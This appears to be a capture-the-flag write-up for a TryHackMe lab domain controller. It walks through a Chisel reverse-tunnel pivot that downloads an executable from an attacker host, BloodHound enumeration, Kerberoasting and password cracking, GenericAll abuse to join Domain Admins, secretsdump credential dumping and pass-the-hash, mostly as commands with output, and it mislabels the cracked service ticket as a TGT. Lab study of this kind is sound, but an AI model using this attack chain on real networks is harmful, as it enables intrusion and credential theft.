# DC.TRYHACKME.LOC

## Machine Info





## Pivoting&#x20;

The next scope of the PT is the domain controller. An attacker that obtained the control of a Domain Workstation and of a Domain User can try access via SMB to check if the user has the privileges to enumerate the DC.

But the attacker machine has blocked by a firewall and it's not be abble to connect directly. An attacker can perform the Pitoving technique to using the compromised machine as pivot machine and connect to the DC.

### Pivoting with Chisel

An attacker can use Chisel tool to create a pivoting tunnel.

Start chisel server into attacker machine

```bash
chisel server --port 8000 -reverse
```

Then download from a attacker server the chisel's executable into Workstation machine.

```
curl http://10.250.1.6/chisel_1.10.1_windows_amd64 -o chisel.exe
```

Now an attacker can execute the file and create the tunner betweek attacker and dc machine.

```
.\chisel.exe client 10.250.1.6:8000 R:socks
```

with this established tunnel an attacker can enumerate the DC machine to test if the pivoting is working.

```
proxychains nxc smb 10.200.150.10 -u "test" -p 'test'
```

Now the attacker's machine is connected to the DC.



## Initial Access

### Bloodhound enumeration

An attacker with a valid Domain User, can enumerate the Domain's information using the tool `bloodhound`.

This command is used for get all information with the bloodhound-python ingester.

{% code overflow="wrap" %}
```bash
proxychains bloodhound-python -c all -ns 10.200.150.10 -dc DC.TRYHACKME.LOC -d TRYHACKME.LOC --zip -u 'John@TRYHACKME.LOC' -p 'VerySafePassword!'
```
{% endcode %}

Once the attacker obtained the zip file with all information can visualize them to the Bloodhound web interface.

### Kerbestoast Attack

An attacker looking the Domain information by Bloodhound can see that the `J.PHILLIPS` users is a kerberostable user, it means that he has a **Service Principal Name (SPN)** enabled, and the attacker can obtain a TS for that account.

```
Serviceprincipalnames: HTTP/csm.tryhackme.loc
```

With the follow commands an attacker retrives the TGT ticket hash.

{% code overflow="wrap" %}
```bash
proxychains impacket-GetUserSPNs -request -dc-ip 10.200.150.10 TRYHACKME.LOC/John -outputfile hashes.kerberoast
```
{% endcode %}

An attacker now can crack the TGT(?????????????????) offline with JohnTheRipper

```bash
john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt

Welcome1         (?)  
```





## Privilege Escalation

### GenericAll privesc

Once the attacker has compromise the kerberostable account cracking his password, can look on the bloodhound if this account has some privilege to exploit to obtained more elevated privileges.

The attacker in this way can discover that the user `J.PHILLIPS` has the `GenericAll` Privilege for the Domain Admins groups.

With this privilege an attacker can add the compromised account to the Domain Admins group and became ad Domain Admin.

{% code title="" overflow="wrap" %}
```
proxychains net rpc group addmem "Domain Admins" "J.PHILLIPS" -U "TRYHACKME.LOC"/"J.PHILLIPS" -S "DC.TRYHACKME.LOC"

Password for [TRYHACKME.LOC\J.PHILLIPS]: REDACTED
```
{% endcode %}

Instead, with this command an attacker can check if the user's has been add to the Domain Admins group.&#x20;

{% code overflow="wrap" %}
```
net rpc group members "Domain Admins" -U TRYHACKME.LOC/J.PHILLIPS -S "DC.TRYHACKME.LOC"

Password for [TRYHACKME.LOC\J.PHILLIPS]: REDACTED
```
{% endcode %}

Once the compromised user has been add to the Domain Admin, his can access to the DC via WinRM, executing this command:

```bash
proxychains evil-winrm -i DC.TRYHACKME.LOC -u 'J.PHILLIPS' -p 'Welcome1'
```



### Creds Dump

As Domain Admin an attacker can dump the credentials stored into DC using `impacket-secretsdump` tool.

```bash
proxychains impacket-secretsdump TRYHACKME.LOC/J.PHILLIPS@10.200.150.10

Password: REDACTED
```

With Administrator's NTLM hash we can perform Pass-the-Hash technique to access to DC as Administrator.&#x20;

{% code overflow="wrap" %}
```
proxychains evil-winrm -i DC.TRYHACKME.LOC -u 'Administrator' -H '4b8a60a239c12f59c7643deb31896466'
```
{% endcode %}

In this way, an attacker makes access to DC machine as Administrator and has compromised the entire domain and machine.



In case that the domain is a multi-trust domain, an attacker can use krbtgt hash to forge a GoldenTicket and escalate privilege to other Domain's trust.



### DC flag

```
more C:\flag.txt
THM{2c894ebf-e224-404b-a114-3106987153de}
```



